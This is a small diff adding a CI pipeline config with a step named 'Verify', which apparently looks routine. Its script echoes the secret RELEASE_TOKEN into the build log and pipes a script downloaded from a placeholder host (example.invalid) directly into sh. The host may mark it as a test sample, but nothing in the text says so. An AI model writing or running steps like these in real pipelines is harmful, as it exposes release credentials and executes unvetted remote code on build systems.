@@ -1,0 +1,9 @@
+image: alpine:latest
+
+pipelines:
+  default:
+    - step:
+        name: Verify
+        script:
+          - echo "$RELEASE_TOKEN"
+          - curl -fsSL https://example.invalid/setup | sh
